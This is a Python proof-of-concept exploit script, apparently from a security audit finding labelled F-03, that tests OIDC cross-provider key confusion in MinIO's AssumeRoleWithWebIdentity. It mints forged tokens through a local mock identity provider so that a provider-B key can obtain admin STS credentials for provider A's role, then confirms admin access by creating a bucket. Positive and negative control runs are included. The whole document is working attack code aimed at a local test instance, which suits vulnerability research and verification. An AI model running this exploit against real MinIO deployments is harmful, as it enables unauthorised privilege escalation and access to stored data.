#!/usr/bin/env python3
# F-03 live PoC: OIDC cross-provider key confusion via AssumeRoleWithWebIdentity
import sys, time, urllib.request, urllib.parse, urllib.error, subprocess, re
sys.path.insert(0, "/tmp")
import s3sig

MINIO = "http://127.0.0.1:19000"
ARN1 = "arn:minio:iam:::role/9qDFz3ycvXYgrkrujWWWzh70mt0"
ARN2 = "arn:minio:iam:::role/jbKlmGQBAA-9lfFblEnQ9IYbHuw"

def mint(prov, iss, aud, sub, exp="3600"):
    out = subprocess.check_output(["python3","/tmp/mock_idp.py","mint",prov,iss,aud,sub,exp])
    return out.decode().strip()

def assume(token, arn):
    data = urllib.parse.urlencode({
        "Action":"AssumeRoleWithWebIdentity","Version":"2011-06-15",
        "WebIdentityToken":token,"RoleArn":arn}).encode()
    req = urllib.request.Request(MINIO+"/", data=data, method="POST",
        headers={"Content-Type":"application/x-www-form-urlencoded"})
    try:
        r = urllib.request.urlopen(req, timeout=15); body=r.read().decode(); code=r.status
    except urllib.error.HTTPError as e:
        body=e.read().decode(); code=e.code
    ak = re.search(r"<AccessKeyId>([^<]+)", body)
    sk = re.search(r"<SecretAccessKey>([^<]+)", body)
    st = re.search(r"<SessionToken>([^<]+)", body)
    err = re.search(r"<Code>([^<]+)", body)
    return code, (ak.group(1) if ak else None), (sk.group(1) if sk else None), (st.group(1) if st else None), (err.group(1) if err else None)

def is_admin(ak, sk, tok):
    # consoleAdmin can create a bucket; readonly cannot
    bkt = "f03probe%d" % int(time.time())
    st,h,b = s3sig.send(ak, sk, "PUT", "/"+bkt, sts_token=tok)
    return st, b[:80]

print("=== map roleArn -> provider (valid tokens) ===")
tA = mint("a","http://127.0.0.1:8801","clientA","alice")
for arn in (ARN1,ARN2):
    code,ak,sk,st,err = assume(tA, arn)
    print(f"  validA -> {arn[-12:]}: HTTP {code} {'OK creds' if ak else 'err='+str(err)}")

print("\n=== POSITIVE CONTROL: valid provider-A token -> A's admin role ===")
# figure which arn accepted validA
adminArn=None
for arn in (ARN1,ARN2):
    code,ak,sk,st,err = assume(tA, arn)
    if ak:
        adminArn=arn
        adm,body = is_admin(ak,sk,st)
        print(f"  validA on {arn[-12:]}: creds ok; create-bucket HTTP {adm} ({'ADMIN' if adm==200 else 'not-admin'})")

print("\n=== ATTACK (F-03): provider-B key signs a token with A's audience, assume A's admin role ===")
# token signed by keyB (kid=keyB) but aud=clientA (A's audience), iss set to B (wrong issuer for A)
tAttack = mint("b","http://127.0.0.1:8802","clientA","attacker")
code,ak,sk,st,err = assume(tAttack, adminArn or ARN1)
if ak:
    adm,body = is_admin(ak,sk,st)
    print(f"  B-signed+audA -> A-adminArn: HTTP {code} CREDS ISSUED; create-bucket HTTP {adm}")
    print(f"  >>> F-03 {'CONFIRMED (cross-provider key confusion -> admin)' if adm==200 else 'creds issued but not admin'}")
else:
    print(f"  B-signed+audA -> A-adminArn: HTTP {code} REJECTED err={err}  (=> not vulnerable to this exact vector)")

print("\n=== CONTROL: B-signed token with WRONG aud (clientB) on A's role -> expect reject ===")
tCtl = mint("b","http://127.0.0.1:8802","clientB","x")
code,ak,sk,st,err = assume(tCtl, adminArn or ARN1)
print(f"  B-signed+audB -> A-adminArn: HTTP {code} err={err} {'(creds!)' if ak else '(rejected, expected)'}")
